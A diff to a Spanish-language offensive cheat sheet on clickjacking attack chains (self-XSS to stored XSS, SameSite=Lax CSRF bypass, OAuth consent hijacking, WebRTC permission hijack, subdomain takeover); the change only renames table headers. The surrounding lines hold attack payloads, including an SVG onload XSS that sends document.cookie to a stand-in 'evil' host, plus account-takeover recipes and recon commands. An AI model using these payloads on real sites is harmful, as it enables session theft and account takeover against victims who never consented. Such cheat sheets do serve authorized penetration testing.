@@ -26,7 +26,7 @@ linked:
 
 ## Self-XSS → Stored XSS
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Self-XSS aislado no escala (víctima debe ejecutar payload en su propia sesión). Clickjack del submit lo convierte en stored. | Amplificación. |
 | Pre-fill via URL params | `?bio=<svg/onload=fetch('//evil/?'+document.cookie)>` | Server reflecta input. |
@@ -65,7 +65,7 @@ ___
 
 ## SameSite=Lax CSRF Bypass
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | `SameSite=Lax` bloquea cross-site POST pero permite top-level GET nav. Clickjack dispara nav top-level → cookies fluyen. | Bypass principal Lax. |
 | GET endpoint sensible | `/account/delete?confirm=true` | Endpoint vulnerable. |
@@ -100,7 +100,7 @@ ___
 
 ## OAuth Consent Hijacking
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | OAuth `/authorize` endpoints frecuentemente frameables (no XFO/CSP). Clickjack del "Authorize" → atacante recibe code/token. | OAuth ATO chain. |
 | Endpoint frameable | `curl -sI /oauth/authorize \| grep -iE 'x-frame\|frame-ancestors'` | Detection. |
@@ -120,7 +120,7 @@ ___
 
 ## WebRTC getUserMedia Hijack
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Clickjack del prompt "Allow camera/mic" en custom permission UIs (no en prompt nativo browser, no frameable cross-origin). | Hardware abuse. |
 | Browser nativo bloqueado | Chrome/Firefox bloquean `getUserMedia` prompt en iframes cross-origin desde 2022 | Limitación. |
@@ -140,7 +140,7 @@ ___
 
 ## Subdomain Takeover Trust Transfer
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Atacante reclama subdomain (CNAME dangling) → mismo eTLD+1 que víctima → bypass `frame-ancestors 'self'` y `*.victim.com`. | Trust transfer. |
 | Recon CNAMEs dangling | `subjack`, `nuclei -t takeovers/`, `dnsx` | Discovery. |
